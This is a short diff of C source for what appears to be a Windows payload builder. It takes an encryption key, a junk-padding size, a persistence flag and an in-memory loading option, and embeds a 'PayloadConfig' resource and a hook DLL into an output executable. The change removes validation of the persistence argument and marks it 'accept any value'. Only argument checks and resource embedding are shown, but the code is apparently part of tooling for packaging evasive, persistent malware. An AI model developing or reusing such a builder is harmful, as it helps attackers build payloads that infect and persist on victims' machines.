@@ -20,7 +20,7 @@ int main(int argc, char *argv[]) {
     const char *output_path = argv[2];
     const char *key_hex = argv[3];
     int junk_size_mb = atoi(argv[4]);
-    int persistence = atoi(argv[5]);
+    int persistence = atoi(argv[5]); // No validation, accept any value
     int load_in_memory = atoi(argv[6]);
 
     // Validate key_hex (should be 64 chars for a 32-byte key)
@@ -40,11 +40,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    // Validate persistence and load_in_memory
-    if (persistence != 0 && persistence != 1) {
-        fprintf(stderr, "Error: Persistence must be 0 or 1.\n");
-        return 1;
-    }
+    // Validate load_in_memory
     if (load_in_memory != 0 && load_in_memory != 1) {
         fprintf(stderr, "Error: Load in memory must be 0 or 1.\n");
         return 1;
@@ -298,7 +294,6 @@ int main(int argc, char *argv[]) {
 
         free(hook_dll_data);
     } else {
-        // For on-disk execution, embed the PayloadConfig directly into the output executable
         if (!UpdateResource(hUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config, config_size)) {
             fprintf(stderr, "Error: UpdateResource for PayloadConfig in output executable failed: %d\n", GetLastError());
             EndUpdateResource(hUpdate, TRUE);
